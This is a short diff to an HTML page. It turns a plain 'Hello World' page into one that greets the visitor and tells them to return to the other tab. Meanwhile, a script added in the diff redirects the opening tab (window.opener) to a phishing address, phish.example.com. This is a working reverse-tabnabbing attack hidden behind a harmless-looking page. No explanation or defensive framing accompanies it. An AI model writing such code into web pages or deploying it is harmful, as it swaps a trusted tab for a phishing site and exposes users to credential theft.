@@ -1,6 +1,10 @@
-<!DOCTYPE html>
 <html>
-<body>
-<h1>Hello World</h1>
-</body>
+ <body>
+ <h1>Hello. Go back to the other tab.</h1>
+  <script>
+   if (window.opener) {
+      window.opener.location = "https://phish.example.com";
+   }
+  </script>
+ </body>
 </html>
